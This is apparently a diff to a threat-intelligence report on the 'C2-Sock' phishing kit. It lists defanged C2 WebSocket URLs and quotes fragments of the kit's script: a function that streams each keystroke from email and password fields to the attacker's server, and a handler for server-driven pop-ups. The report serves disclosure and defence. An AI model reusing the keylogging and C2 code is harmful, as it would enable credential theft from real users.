@@ -6,18 +6,18 @@ AUTHORS:
 
 NOTES:
 
-- We have identified phishing activity that we've nicknamed "C2-Sock" phishing
-- The campaign uses a malicious script for activity like keylogging and stealing credentials
-- This also allows changing web content (redirects/popups) in real-time via WebSockets by building a persistent connection. 
-- This phishing content streams everything you type, and it fingerprints your device for tracking
+- We have identified phishing activity that we've nicknamed the "C2-Sock" campaign.
+- The campaign uses a malicious script for activities like keylogging and stealing credentials.
+- It also allows changing web content (redirects/popups) in real-time via WebSockets by building a persistent connection. 
+- This campaign's phishing content streams everything you type, and it fingerprints your device for tracking.
 
 DETAILS:
 
-- This campaign uses Chinese language phishing pages, and it uses China (.cn) top-level domains (TLDs).
 - This type of phishing kit combines credential theft with live session interaction.
 - The kit allows attackers to control web page content in real-time. 
 - Like traditional phishing, this kit captures submitted form data.
 - But it also establishes a persistent command-and-control (C2) channel within the victim's browser.
+- This campaign uses Chinese language phishing pages, and it uses China (.cn) top-level domains (TLDs).
 
 CORE CAPABILITIES:
 
@@ -159,12 +159,14 @@ WEBSOCKETS TRAFFIC TO C2 SERVER CAUSED BY THE ABOVE PHISHING PAGE EXAMPLE:
 - hxxps[:]//rtwmh[.]cn:2012/qiantaizhuanyon_chaxun/chaxunkaiguan
 - hxxps[:]//rtwmh[.]cn:2012/chuanshu1/chuanshu?qishixianshi=13
 - hxxps[:]//rtwmh[.]cn:2012/zhilingtai1/zhilingtai
+
 - hxxps[:]//rtwmh[.]cn:2012/zhilingtai1/zhilingtai
 
 CODE SNIPPETS FROM PAGE:
 
-NOTE: The following is from script returned from hxxp[:]//7565906.jfkxn[.]cn/1/js/xm.js on 2025-10-15.
-      SHA256 hash for the returned script is: e8137222931af90e2bdc73e56354270aeb4e1e61e2e7c214b943f864e5c1135c
+NOTES: The following is from script returned from hxxp[:]//7565906.jfkxn[.]cn/1/js/xm.js on 2025-10-15.
+       SHA256 hash for the returned script is: e8137222931af90e2bdc73e56354270aeb4e1e61e2e7c214b943f864e5c1135c
+       We've added comments in sections of these code snippets.
 
 1. C2 Channel Establishment: 
   - This line of code initiates the WebSocket connection to the attacker-controlled C2 server. 
@@ -175,7 +177,7 @@ NOTE: The following is from script returned from hxxp[:]//7565906.jfkxn[.]cn/1/j
 2. Live Keylogging and Exfiltration:
   - The script adds event listeners to the email (rmz) and password (sfzj) input fields. 
   - The shishijiankong1 function is triggered on every input event (i.e., every keystroke)
-  - This function immediately sending the typed character and the field name to the C2 server.
+  - This function immediately sends the typed character and the field name to the C2 server.
 
     // Function to send keystrokes to the C2 server in real-time
     function shishijiankong1(canshu,canshu1){
@@ -197,7 +199,7 @@ NOTE: The following is from script returned from hxxp[:]//7565906.jfkxn[.]cn/1/j
     socket.on('pushMsg',function(data){
         var fanhuia=data;
         if(fanhuia.kongzhi=="1"){
-            // Displays a server-controlled popup message
+            // Displays a server-controlled pop-up message
             layer.open({
                 title: '信息',
                 content: fanhuia.neirong
